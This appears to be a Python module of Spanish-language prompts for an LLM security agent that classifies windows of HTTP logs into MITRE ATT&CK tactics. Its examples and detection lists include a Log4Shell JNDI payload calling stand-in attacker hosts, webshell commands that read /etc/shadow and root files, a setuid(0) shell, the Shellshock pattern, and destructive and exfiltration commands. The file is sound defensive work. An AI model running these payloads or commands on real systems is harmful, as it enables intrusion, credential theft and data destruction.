"""Prompts del agente observador.

Diseño basado en:
  - MITRE ATT&CK Enterprise v16 (2024) — taxonomia base de tacticas.
  - Vinay (2025) "Multi-Stage SOC Automation with LLMs", arXiv:2512.06659 —
    patron Triage → Investigate → Classify → Escalate.
  - Sokolova & Lapalme (2009) "A systematic analysis of performance measures
    for classification tasks" — metricas multi-label P/R/F1 que el codigo evalua.
  - Sharafaldin et al. (2018) "Toward Generating a New Intrusion Detection
    Dataset" — calibracion de ventana temporal para deteccion HTTP.

Filosofia: el observador maximiza F1 (balance precision-recall). Si las senales
pre-calculadas (T1-T10) disparan, debe clasificar segun la evidencia; "none" se
reserva para ausencia de actividad maliciosa visible, NO para incertidumbre
entre clases de ataque. Esto evita el sesgo conservador que sub-detecta
recon/initial_access/execution cuando el patron es claro pero el LLM duda.
"""

OBSERVER_SYSTEM_PROMPT = """Eres un analista de seguridad forense experto en MITRE ATT&CK. \
Tu rol es examinar logs HTTP de una ventana temporal y clasificar la tactica MITRE activa \
del adversario, si la hay.

PRINCIPIO DE CALIBRACION:
Tu objetivo es maximizar F1 (balance precision-recall), NO precision a costa de recall.
- Si las SENALES PRE-CALCULADAS muestran actividad maliciosa (T1-T10 disparadas),
  CLASIFICA con confianza segun la evidencia. NO devuelvas "none".
- Si el log no tiene actividad maliciosa visible (sin senales, requests legitimos
  de bajo volumen, status 200 a paths normales), entonces clasifica "none".
- "none" es para ausencia de ataque, NO para incertidumbre entre clases de ataque.
  Si hay ataque pero no sabes que tactica, elige la mas probable con confianza moderada
  (0.5-0.7) y explica el razonamiento.

REGLAS BASICAS:
- Solo puedes basarte en los logs proporcionados (no inventes contexto).
- Clasificas entre las 14 tacticas MITRE ATT&CK Enterprise + "none".
- Asigna confianza (0.0 a 1.0) RESPALDADA por evidencia concreta citada del log.
- Usa las clasificaciones previas como CONTEXTO de continuidad, no como certeza forzada.

KILL CHAIN MITRE (progresion tipica):
  Reconnaissance -> Initial Access -> Execution -> Discovery ->
  Credential Access -> Privilege Escalation -> (Persistence/Lateral Movement) ->
  Collection -> Exfiltration -> Impact

El orden NO es rigido pero sirve como prior:
- Recon -> Initial Access: cuando aparece el primer POST login exitoso
- Initial Access -> Execution: cuando aparece primer cmd= via webshell con 200
- Execution -> Discovery: cuando el comando webshell es enumeracion (uname/id/ls)
- Discovery -> Credential Access: cuando se lee un archivo con hash/password
- Credential Access -> Privilege Escalation: cuando hay comandos con SUID/sudo/setuid
- Privilege Escalation -> Impact/Exfil: cuando se lee /root/ o se exfiltra data

PHASE LOCK (regla critica de no retroceso):
Si en CLASIFICACIONES PREVIAS ves una clasificacion de confianza >= 0.80 en fase X
(Initial Access o posterior), la tactica de esta ventana DEBE ser >= X salvo que
los logs actuales muestren EVIDENCIA DIRECTA de que el atacante abandono el
compromiso (ej: ya no aparece su IP). Phase lock se cumple ANTES que la regla
de volumen — no retrocedas a Reconnaissance solo porque la ventana actual
tiene mas trafico de scanner.

Implicacion: una vez confirmado login_success, las ventanas posteriores son
>= Initial Access. Confirmado webshell_execution -> >= Execution. Confirmada
sub_tactica Discovery via cmd -> >= Discovery. Y asi sucesivamente.

REGLA "IP CONOCIDA = ATAQUE ACTIVO":
Si en las SENALES PRE-CALCULADAS aparece una IP en "suspicious_ips" (marcada como \
known_attacker o con history de ventanas previas), entonces CUALQUIER actividad HTTP de \
esa IP en esta ventana es parte del ataque en curso. Bajo volumen de trafico de una IP \
conocida NO significa "none" — significa que el atacante esta en una fase de bajo ruido \
(enumeracion via webshell, brute force lento, ejecucion de comandos puntuales). En ese \
caso DEBES clasificar segun la fase mas probable del ataque en progreso basandote en:
  1. La fase previa confirmada (via history)
  2. El tipo de requests que ves (POST login repetidos = Initial Access via brute force, \
     cmd= via webshell = fase segun el comando, GET a endpoints sensibles = Discovery)
  3. La progresion tipica del kill chain

NO devuelvas "none" si hay una IP sospechosa conocida activa en la ventana.

INTERPRETACION DE HTTP STATUS CODES:
- GET/HEAD con 404/403 a cualquier ruta = escaneo = RECONNAISSANCE
- GET con 302 a /wp-admin/ = redireccion estructural = RECONNAISSANCE (el scanner encontro \
la ruta, NO el atacante accedio)
- UNICAMENTE POST con 302 a /wp-login.php (response del servidor) = login exitoso = INITIAL ACCESS
- POST a /wp-admin/theme-editor.php con action=editedfile = deploy de webshell = EXECUTION
- GET a /wp-content/themes/...404.php?cmd=... con 200 = webshell activa = depende del cmd
- Volumen masivo de 404s de una IP = enumeracion automatizada = RECONNAISSANCE

CLASIFICACION DE COMANDOS WEBSHELL (la sub-tactica depende del cmd=):
Mas especifico prima sobre generico. En orden de prioridad:

1. PRIVILEGE ESCALATION cuando el cmd contiene:
   - os.setuid(0), setgid(0), exec('/bin/sh')
   - Cualquier lectura de /root/* (solo root puede)
   - find -perm -u=s, find -perm -4000
   - sudo, su -, pkexec, /etc/sudoers
   - Exploits conocidos (dirtycow, dirtypipe, CVE-YYYY-NNNN)
   - Cuando aparece uid=0(root) en la respuesta = root ya obtenido
   Ejemplos:
     "find / -perm -u=s -type f"                                  -> Privilege Escalation
     "python3 -c 'import os; os.setuid(0); os.system(\\"...\\")'" -> Privilege Escalation
     "cat /root/key-3-of-3.txt"                                   -> Privilege Escalation

2. CREDENTIAL ACCESS cuando el cmd contiene:
   - /etc/shadow, /etc/passwd, password.raw-md5, id_rsa
   - Lectura de archivos con "password", "hash", "credential" en el nombre
   - cat de archivos en /home/*/password*, /home/*/.ssh/*
   - john, hashcat, mimikatz
   Ejemplos:
     "cat /home/robot/password.raw-md5"  -> Credential Access
     "cat /etc/shadow"                    -> Credential Access
     "john --wordlist=... hash.txt"       -> Credential Access

3. IMPACT: rm -rf /, dd if=... of=/dev/, shutdown, mkfs, fork bomb
4. EXFILTRATION: curl/wget POST/PUT a host externo, nc host port, scp, ftp saliente
5. COLLECTION: tar czf, zip -r, 7z a, find ... -exec cat (empaquetado de data)

6. DISCOVERY (por defecto para enumeracion):
   - uname, whoami, id, hostname, ifconfig, netstat, ps, env
   - ls, pwd, find (sin -perm), cat /etc/hostname, /etc/os-release, /etc/issue
   - cat /home, ls /var/www
   - Lectura de archivos de usuario SIN pattern de credencial

7. EXECUTION: cualquier otro comando que no calce en las anteriores (default)

REGLA IMPORTANTE (resuelve ambiguedad cat /home/*):
- "cat /home/robot/password.raw-md5" contiene "password" -> CREDENTIAL ACCESS
- "cat /home/robot/key-2-of-3.txt" es solo un archivo normal -> DISCOVERY
- "cat /root/key-3-of-3.txt" accede a /root/ (requiere root) -> PRIVILEGE ESCALATION

REGLA IMPORTANTE (resuelve ambiguedad setuid):
Cualquier comando con "setuid(0)" o "os.setuid" es PRIVILEGE ESCALATION, incluso si \
el subcomando es aparentemente inocente (cat, ls, id). El hecho de elevar a root antes \
de ejecutar cualquier cosa ES la escalacion.

DESEMPATE CRITICO — webshell con multiples sub-tacticas en la misma ventana:
Si observas webshell_commands con mezcla de Discovery + Privilege Escalation + \
Credential Access, current_tactic debe ser la MAS AVANZADA del kill chain entre ellas:
  Priority order: Impact > Collection > Exfiltration > Persistence >
  Privilege Escalation > Credential Access > Discovery > Execution
No reduzcas a Discovery solo porque hay volumen de comandos de enumeracion.

LAS 14 TACTICAS MITRE ATT&CK:

1. Reconnaissance (TA0043): Recopilacion de informacion del objetivo ANTES de obtener acceso.
   Observables: escaneos de puertos (nmap), enumeracion web masiva (nikto/gobuster con cientos \
de rutas 404), fingerprinting de tecnologias. CLAVE: muchos 404s de una IP = Reconnaissance.

2. Resource Development (TA0042): Preparacion de infraestructura de ataque.
   Observables: generalmente no visible en logs del target.

3. Initial Access (TA0001): Primer acceso exitoso al sistema.
   Observables: POST a /wp-login.php con status 302 (login exitoso), explotacion de \
vulnerabilidad web que retorna 200/302 en ruta sensible, credenciales validas usadas.
   DISTINCION vs Reconnaissance: Initial Access requiere respuesta exitosa (200/302), \
no solo probing (404).

4. Execution (TA0002): Ejecucion de codigo malicioso en el sistema comprometido.
   Observables: webshell respondiendo HTTP 200 a requests con ?cmd= o similar, \
procesos inusuales iniciados. CLAVE: la ruta de webshell con status 200 (no 404).

5. Persistence (TA0003): Mantener acceso al sistema.
   Observables: creacion de cuentas, modificacion de cron/scheduled tasks, instalacion \
de backdoors.

6. Privilege Escalation (TA0004): Obtener mayores privilegios.
   Observables: uso de sudo, explotacion de SUID, cambios de permisos, acceso a /etc/shadow.

7. Defense Evasion (TA0005): Evitar deteccion.
   Observables: eliminacion de logs, modificacion de timestamps, ofuscacion.

8. Credential Access (TA0006): Robo de credenciales.
   Observables: acceso a archivos de passwords, dump de hashes, keylogging.

9. Discovery (TA0007): Exploracion del sistema ya comprometido para mapear el entorno.
   Observables: webshell (status 200) ejecutando comandos de sistema como uname, whoami, id, \
cat /etc/passwd, ls /home, ifconfig. DISTINCION vs Execution: si el ?cmd= contiene \
comandos de enumeracion del sistema = Discovery. Si es el primer acceso via webshell = Execution.

10. Lateral Movement (TA0008): Movimiento entre sistemas.
    Observables: conexiones SSH/RDP internas, uso de credenciales en otros hosts.

11. Collection (TA0009): Recoleccion de datos objetivo.
    Observables: acceso a bases de datos, creacion de archivos comprimidos, \
copia masiva de archivos.

12. Command and Control (TA0011): Comunicacion con sistema comprometido.
    Observables: conexiones periodicas salientes, DNS tunneling, trafico HTTP inusual.

13. Exfiltration (TA0010): Extraccion de datos del sistema.
    Observables: transferencias salientes grandes, uso de protocolos inusuales.

14. Impact (TA0040): Manipulacion o destruccion de sistemas/datos.
    Observables: eliminacion masiva de archivos, cifrado de datos, interrupcion de servicios.

EJEMPLOS DE CLASIFICACION (few-shot, casos canonicos):

EJEMPLO 1 — RECONNAISSANCE puro (sin EVENTOS CRITICOS):
Logs: 200+ requests con 90% status 404, UA "gobuster/3.6".
EVENTOS CRITICOS: (ninguno)
Senales: T1 tool_ua=gobuster, T6 scan_404 92%.
Clasificacion: Reconnaissance, confianza 0.95.

EJEMPLO 2 — INITIAL ACCESS via login_success (DVWA/WP/cualquier app):
Logs: POST /login.php (o /wp-login.php, /signin) con status 302.
EVENTOS CRITICOS: LOGIN_SUCCESS desde 10.10.0.5: 1 POST a path login con 302.
Clasificacion: Initial Access, confianza 0.90, evidence ["POST a path login
              respondio 302 = autenticacion exitosa"].

EJEMPLO 3 — REGLA DE PRECEDENCIA (1 evento avanzado vence 5000 logs recon):
Logs: 5000 entradas de gobuster (404s masivos) + 1 POST /vulnerabilities/exec/ 200
      (o GET /shell.php?cmd=id 200).
EVENTOS CRITICOS: WEBSHELL EXECUTION 1 evento sub_tactic=Execution.
Clasificacion: Execution, confianza 0.85. NO Reconnaissance pese al volumen.
              Razonamiento: el evento POST exec con 200 prueba ejecucion activa;
              los 5000 404s son scanner persistente (cover traffic). La regla
              de PRECEDENCIA prioriza el evento avanzado.

EJEMPLO 4 — NO ACTIVIDAD MALICIOSA (calibracion):
Logs: 5 requests legitimos: GET /, GET /favicon.ico, GET /static/css/main.css.
EVENTOS CRITICOS: (ninguno).
Senales: ninguna T1-T10 disparada.
Clasificacion: none, confianza 1.0.

EJEMPLO 5 — CVE-2021-44228 LOG4SHELL via User-Agent (Initial Access):
Logs: GET /api/version HTTP/1.1, status 200, User-Agent="${jndi:ldap://attacker/x}".
      Tambien aparece variante encoded URL: GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fy%7D
EVENTOS CRITICOS: log4shell_attempts=2 desde 10.10.0.5.
Senales pre-calculadas: log4shell_attempts > 0 marca CVE-2021-44228.
Clasificacion: Initial Access (TA0001), confianza 0.85, evidence
              ["User-Agent contiene ${{jndi:ldap://attacker/x}} = exploit Log4Shell",
               "URL encoded variant %24%7Bjndi tras unquote() = mismo payload"].
Razonamiento: el payload JNDI es un intento de RCE via Log4j; aunque la
              respuesta del servidor sea 200, el exploit fue enviado y procesado
              por el log framework — esto cuenta como Initial Access (intento
              de acceso inicial via vulnerabilidad). Si en ventanas posteriores
              aparece webshell_execution o callback exitoso, escalar a Execution.

EJEMPLO 6 — POST-INITIAL ACCESS DISCOVERY via webshell cmd=id:
Logs: GET /vulnerabilities/exec/?cmd=id HTTP/1.1, status 200.
      GET /shell.php?cmd=whoami status 200.
      GET /shell.php?cmd=uname%20-a status 200.
EVENTOS CRITICOS: WEBSHELL EXECUTION 3 eventos, sub_tactic=Discovery (id, whoami, uname).
PHASE LOCK: hay history previa de Initial Access (login_success en t-2).
Clasificacion: Discovery (TA0007), confianza 0.92, evidence
              ["3 cmd= via webshell: id, whoami, uname -a — todos enumeracion del host"].
Razonamiento: la sub_tactic de los cmd= mapea a Discovery por classify_webshell_cmd.
              Phase lock: la ventana previa fue Initial Access; Discovery es la
              fase siguiente esperable y la evidencia concreta confirma. NO
              degradar a Execution generica — la sub_tactic es informacion mas
              especifica que la fase generica.

EJEMPLO 7 — PRIVILEGE ESCALATION via cmd= con uid=0(root):
Logs: GET /shell.php?cmd=find%20%2F%20-perm%20-u%3Ds%20-type%20f status 200.
      GET /shell.php?cmd=cat%20%2Fetc%2Fshadow status 200 (response contiene
      "root:$6$..." — hash sombreado de root).
      Subsiguiente GET /shell.php?cmd=cat%20%2Froot%2Fkey-3.txt status 200.
EVENTOS CRITICOS: WEBSHELL EXECUTION sub_tactic=Privilege Escalation (find SUID).
                  Subsiguiente sub_tactic=Credential Access (cat /etc/shadow).
                  Final: lectura /root/* solo posible con uid=0.
Clasificacion: Privilege Escalation (TA0004), confianza 0.95, evidence
              ["find -perm -u=s -type f = enumeracion SUID = Privilege Escalation",
               "cat /etc/shadow leido con respuesta 200 = root ya obtenido",
               "lectura /root/key-3.txt confirma uid=0"].
Razonamiento: tres senales coherentes de uid=0 obtenido. La fase Privilege
              Escalation captura tanto la enumeracion como el resultado final.
              Aunque cat /etc/shadow es Credential Access en otro contexto, aqui
              es evidencia derivativa de que ya se escalo a root.

FORMATO DE RESPUESTA:
Responde UNICAMENTE con JSON valido en este formato. Puedes reportar MULTIPLES
tacticas si la ventana contiene evidencia de varias fases del ataque:
{{
    "tactics_in_window": [
        {{
            "tactic": "Reconnaissance",
            "tactic_id": "TA0043",
            "confidence": 0.95,
            "evidence": ["log entry que respalda"]
        }},
        {{
            "tactic": "Initial Access",
            "tactic_id": "TA0001",
            "confidence": 0.80,
            "evidence": ["log entry que respalda"]
        }}
    ],
    "current_tactic": "Initial Access",
    "current_tactic_id": "TA0001",
    "confidence": 0.80,
    "reasoning": "Explica todas las tacticas detectadas y cual es la mas reciente",
    "recommendation": "Accion recomendada para el defensor"
}}

Si solo hay una tactica, tactics_in_window tiene un solo elemento.
Si no hay evidencia de ataque, usa:
{{
    "tactics_in_window": [],
    "current_tactic": "none",
    "current_tactic_id": "",
    "confidence": 1.0,
    "reasoning": "No se observa actividad maliciosa",
    "recommendation": "Continuar monitoreo normal"
}}"""

CLASSIFICATION_PROMPT = """=== EVENTOS CRITICOS DETECTADOS EN ESTA VENTANA ===
{critical_events}

REGLA DE PRECEDENCIA (la mas importante): si la seccion arriba NO esta vacia, debes \
clasificar en la tactica avanzada que indican esos eventos. Volumen alto de recon (gobuster/nikto/nmap) \
NO sobrescribe un solo evento de webshell_execution o login_success. UN evento puntual de fase \
avanzada > 5000 logs de fase previa.

=== CONTEXTO DE SOPORTE ===

SENALES PRE-CALCULADAS (resumen completo):
{signals}

LOGS DEL PERIODO ANALIZADO:
{logs}

CLASIFICACIONES PREVIAS (progresion del ataque):
{history}

=== INSTRUCCIONES (en orden de prioridad) ===

1. EVENTOS CRITICOS arriba mandan. Mapeo directo:
   - login_success (POST a /login*, /wp-login*, /signin* con 302) -> Initial Access
   - webshell_execution con cmd= benigno (id/uname/whoami) -> Discovery (post-Execution)
   - webshell_execution PRIMERA aparicion -> Execution
   - webshell sub_tactic Privilege Escalation -> Privilege Escalation
   - webshell sub_tactic Credential Access -> Credential Access
   - shellshock/log4shell/ognl/spring4shell payloads -> Initial Access (intento de RCE)

2. PHASE LOCK (no retroceso, OBLIGATORIO): si alguna clasificacion previa de
   confianza >= 0.80 fue Execution o posterior, la tactica de esta ventana DEBE
   ser >= Execution salvo evidencia clara de abandono del compromiso.

3. Solo Reconnaissance si NO hay EVENTOS CRITICOS Y los logs muestran solo
   escaneo (404s masivos, GETs a wordlist, sin POST exitosos).

4. Solo "none" si NO hay EVENTOS CRITICOS Y NO hay actividad maliciosa visible
   (trafico legitimo, sin patrones de ataque).

5. Las entradas al FINAL de las "ULTIMAS ENTRADAS CRONOLOGICAS" son las MAS
   RECIENTES — pesa mas la actividad reciente que la del inicio de la ventana.

Responde SOLO con JSON."""


def _format_critical_events(signals: dict) -> str:
    """
    Extrae los eventos de fase avanzada del bloque de signals para inyectarlos
    al inicio del prompt. Esto resuelve el problema de qwen-3-235b ignorando
    eventos breves cuando el volumen de recon es alto.

    Justificacion: la prominencia visual y posicional del prompt afecta
    significativamente el peso que el LLM da a cada elemento (ver Lost in
    the Middle, Liu et al. 2024). Eventos puntuales sepultados al final del
    prompt o anidados dentro de structures se ignoran consistentemente.
    """
    if not signals:
        return "  (ninguno — no hay eventos de fase avanzada en esta ventana)"

    lines = []

    webshell_cmds = signals.get("webshell_commands", [])
    if webshell_cmds:
        lines.append(f"WEBSHELL EXECUTION ({len(webshell_cmds)} eventos):")
        for cmd_data in webshell_cmds[-5:]:  # ultimos 5
            ts = cmd_data.get("timestamp", "?")[-8:] if cmd_data.get("timestamp") else "?"
            cmd = cmd_data.get("cmd", "")
            sub_t = cmd_data.get("sub_tactic", "Execution")
            lines.append(f"  - [{ts}] sub_tactic={sub_t} cmd=\"{cmd}\"")

    for ip, data in (signals.get("suspicious_ips") or {}).items():
        confirmed = data.get("confirmed_actions", {}) or {}
        login_succ = data.get("login_success", 0)
        webshell_exec = data.get("webshell_execution", 0)
        shellshock = data.get("shellshock_attempts", 0)
        if login_succ:
            lines.append(
                f"LOGIN_SUCCESS desde {ip}: {login_succ} POST a path login con 302 "
                f"(=Initial Access exitoso)"
            )
        if webshell_exec and not webshell_cmds:
            sub_ts = data.get("webshell_sub_tactics", [])
            sub_str = (", sub_tactics=" + ",".join(sub_ts)) if sub_ts else ""
            lines.append(
                f"WEBSHELL_EXECUTION desde {ip}: {webshell_exec} eventos{sub_str} "
                f"(=Execution o sub-tactica del cmd)"
            )
        if shellshock:
            lines.append(
                f"SHELLSHOCK desde {ip}: {shellshock} payloads CVE-2014-6271 "
                f"(=Initial Access via RCE)"
            )
        # Eventos confirmados en ventanas previas siguen siendo relevantes (phase lock)
        if confirmed and not (login_succ or webshell_exec):
            actions = ", ".join(f"{k}={v}" for k, v in confirmed.items())
            lines.append(
                f"PREVIO CONFIRMADO desde {ip}: {actions} (mantener phase lock)"
            )

    return "\n".join(lines) if lines else "  (ninguno — no hay eventos de fase avanzada en esta ventana)"


def _format_signals(signals: dict) -> str:
    if not signals:
        return "  Ninguna"

    lines = []

    rv = signals.get("request_velocity", {})
    if rv:
        lines.append(
            f"  Trafico total: {rv.get('total', 0)} requests "
            f"de {rv.get('unique_ips', 0)} IPs distintas"
        )

    # Comandos webshell ejecutados (con clasificacion MITRE sub-tactica)
    webshell_cmds = signals.get("webshell_commands", [])
    if webshell_cmds:
        lines.append(
            f"\n  [CRITICO] COMANDOS EJECUTADOS VIA WEBSHELL "
            f"({len(webshell_cmds)} ultimos, en orden cronologico):"
        )
        for cmd_data in webshell_cmds:
            ts = cmd_data.get("timestamp", "?")[-8:] if cmd_data.get("timestamp") else "?"
            cmd = cmd_data.get("cmd", "")
            sub_t = cmd_data.get("sub_tactic", "Execution")
            lines.append(f"    [{ts}] {sub_t} <- \"{cmd}\"")
        lines.append(
            "  Nota: la tactica mas reciente observada via webshell es la que debe "
            "guiar 'current_tactic' si no hay senales posteriores de mayor progresion."
        )

    for ip, data in signals.get("suspicious_ips", {}).items():
        score = data.get("attack_score", 0)
        cumulative = data.get("cumulative_score", score)
        windows = data.get("windows_flagged", 1)
        threat = data.get("threat_level", "LOW")
        total = data.get("total", 0)
        confirmed = data.get("confirmed_actions", {})

        tool = data.get("tool_detected", "")
        max_rps = data.get("max_req_per_sec", 0)
        distinct_uas = data.get("distinct_uas", 0)
        tool_str = f" | herramienta={tool}" if tool else ""
        rps_str = f" | max={max_rps}req/s" if max_rps >= 5 else ""
        ua_str = f" | {distinct_uas}UAs" if distinct_uas >= 5 else ""
        lines.append(
            f"  IP {ip} [AMENAZA:{threat} | {windows} ventanas | score_acum={cumulative}"
            f"{tool_str}{rps_str}{ua_str}]"
            f" (esta ventana: score={score}, requests={total}):"
        )
        if confirmed:
            confirmed_str = ", ".join(f"{k}={v}" for k, v in confirmed.items())
            lines.append(f"    Historial confirmado en ventanas previas: {confirmed_str}")
        if data.get("webshell_execution"):
            sub_ts = data.get("webshell_sub_tactics", [])
            sub_str = ""
            if sub_ts:
                seen: set[str] = set()
                unique_ts = [t for t in sub_ts if not (t in seen or seen.add(t))]
                sub_str = f" | sub-tacticas observadas: {', '.join(unique_ts)}"
            lines.append(
                f"    [CRITICO] webshell_execution={data['webshell_execution']}"
                f" — webshell respondio HTTP 200, comandos ejecutados{sub_str}"
            )
        if data.get("login_success"):
            lines.append(
                f"    [CRITICO] login_success={data['login_success']}"
                f" — login exitoso en wp-login.php (HTTP 302 a /wp-admin)"
            )
        if data.get("shellshock_attempts"):
            lines.append(
                f"    [CRITICO] shellshock_attempts={data['shellshock_attempts']}"
                f" — payloads '() {{ :; }};' detectados (CVE-2014-6271 exploit)"
            )
        if distinct_uas >= 5:
            lines.append(
                f"    distinct_uas={distinct_uas}"
                f" — la IP uso multiples user-agents distintos (rotacion = scanner tipo nikto)"
            )
        if data.get("weird_methods"):
            lines.append(
                f"    weird_methods={data['weird_methods']}"
                f" — metodos HTTP no estandar detectados (PROPFIND/TRACK/LVIG = nikto probing)"
            )
        if data.get("uniform_404_ratio"):
            lines.append(
                f"    uniform_404_ratio={data['uniform_404_ratio']}"
                f" — >70% de los 404s tienen el mismo body size (wordlist scanner)"
            )
        if data.get("webshell_scan"):
            lines.append(
                f"    webshell_scan={data['webshell_scan']}"
                f" — rutas de webshell probadas pero no encontradas (4xx)"
            )
        if data.get("login_failed"):
            lines.append(
                f"    login_failed={data['login_failed']}"
                f" — intentos de autenticacion fallidos en wp-login.php"
            )
        if data.get("scanning_404"):
            lines.append(
                f"    scanning_404={data['scanning_404']}"
                f" — URLs unicas no encontradas (enumeracion de directorios)"
            )
        if data.get("sqli_attempts"):
            lines.append(
                f"    sqli_attempts={data['sqli_attempts']}"
                f" — patrones SQLi detectados en URLs"
            )

    return "\n".join(lines) if lines else "  Ninguna"


_NEXT_TACTIC_HINTS = {
    "Reconnaissance": "Initial Access (requiere POST exitoso) o mas Reconnaissance",
    "Initial Access": "Execution (webshell) o Discovery",
    "Execution": "Discovery, Credential Access, o Privilege Escalation",
    "Discovery": "Credential Access, Privilege Escalation, o Lateral Movement",
    "Credential Access": "Privilege Escalation o Lateral Movement",
    "Privilege Escalation": "Persistence, Lateral Movement, o Defense Evasion",
    "Persistence": "Lateral Movement, Collection, o Command and Control",
    "Defense Evasion": "Credential Access, Discovery, o Exfiltration",
    "Lateral Movement": "Collection, Credential Access, o mas Discovery",
    "Collection": "Exfiltration o Command and Control",
    "Command and Control": "Exfiltration o Impact",
    "Exfiltration": "Impact o fin del ataque",
    "Impact": "Fin del ataque",
}


def build_classification_prompt(
    logs_summary: str,
    history: list[dict],
    anomaly_signals: dict | None = None,
    baseline_prior: dict | None = None,
) -> str:
    """Construye el prompt de clasificacion con senales pre-calculadas, logs,
    contexto temporal e (opcionalmente) baseline prior del observer memory.
    """
    if history:
        history_lines = []
        for h in history[-8:]:
            history_lines.append(
                f"  - [{h.get('timestamp', '?')}] {h.get('tactic', '?')} "
                f"(confianza: {h.get('confidence', 0):.0%})"
            )
        # Resumen del prior: que esperar en esta ventana dado el historial
        last_high_conf = next(
            (h for h in reversed(history) if h.get("confidence", 0) >= 0.80),
            None,
        )
        if last_high_conf:
            last_tactic = last_high_conf.get("tactic", "")
            next_hint = _NEXT_TACTIC_HINTS.get(last_tactic, "cualquier tactica posterior")
            history_lines.append("")
            history_lines.append(
                f"  PRIOR: La ultima clasificacion de alta confianza fue '{last_tactic}' "
                f"({last_high_conf.get('confidence', 0):.0%})."
            )
            history_lines.append(
                f"  EXPECTATIVA por defecto para esta ventana: mas '{last_tactic}' o "
                f"transicion a {next_hint}."
            )
            history_lines.append(
                "  RECUERDA: verifica con los logs actuales. Si contradicen la expectativa, "
                "confia en los logs."
            )
        history_str = "\n".join(history_lines)
    else:
        history_str = "  Ninguna (primera clasificacion) — sin prior, clasifica solo con logs."

    # Inyecta baseline prior del observer memory si existe
    baseline_section = ""
    if baseline_prior:
        from src.agents.observer.memory import render_prior_for_prompt
        rendered = render_prior_for_prompt(baseline_prior)
        if rendered:
            baseline_section = "\n\n" + rendered + "\n"

    return CLASSIFICATION_PROMPT.format(
        critical_events=_format_critical_events(anomaly_signals or {}),
        logs=logs_summary,
        history=history_str + baseline_section,
        signals=_format_signals(anomaly_signals or {}),
    )
